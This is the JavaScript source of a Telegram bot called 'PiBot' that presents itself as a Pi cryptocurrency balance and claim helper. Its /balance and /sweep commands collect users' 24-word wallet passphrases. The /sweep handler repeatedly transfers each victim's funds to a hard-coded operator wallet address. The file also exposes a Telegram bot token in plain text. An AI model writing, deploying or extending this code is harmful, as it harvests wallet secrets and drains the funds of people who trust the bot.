import TelegramBot from "node-telegram-bot-api";
import { getAccountWithoutProxy, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";

const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
console.log('Bot is running')



const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome to PiBot! Type /help to see commandsss.");
})

bot.onText(/\/help/, (msg) => {
    const helpText = `
        📘 PiBot Commands:
        /balance - Show Pi balance
        /claim - Claim unlocked Pi
        /status - Check bot status
        /sweep - sweeps all available pi
        /stop - stops all running process
        `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

const userSessions = {};

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');

    userSessions[chatId] = { waitingForPassphraseForBalance: true }
});

bot.onText(/\/sweep/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) to start sweeping');

    userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Stopping any running process');

    userSessions[chatId]['stopAll'] = true;
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if(userSessions[chatId]?.waitingForPassphraseForSweeping) {
        while(!userSessions[chatId]?.stopAll) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);
            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Sweeping Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Sender: ${kp.publicKey()}`);
                bot.sendMessage(chatId, `✅ Receiver: GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS`);

                const accountData = await getAccountWithoutProxy(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;

                if(balance - 0.01 <= 0) {
                    bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
                } else {
                    const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                    if(result.data && result.data.hash) {
                        return bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
                    } else {
                        bot.sendMessage(chatId, `❌ Sweeping failed`);
                    }
                }
            } catch(error) {
                bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
            }

            await sleep(2000);
        }

        delete userSessions[chatId]
    }
})


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        if(userSessions[chatId]?.waitingForPassphraseForBalance) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);

            if(words.length === 1) {
                bot.sendMessage(chatId, '⏳ Checking validity of the address');
                const accountData = await getAccountWithoutProxy(passphrase.toUpperCase());
                if(!accountData.balances) {
                    return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
                } else {
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
                }
            }

            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Checking Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);

                const accountData = await getAccountWithoutProxy(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
            } catch(error) {
                bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`); 
            }

            // delete userSessions[chatId]
        }
    } catch(err) {
        delete userSessions[chatId]
        return bot.sendMessage(chatId, `❌ Unknown error occured`);
    }
})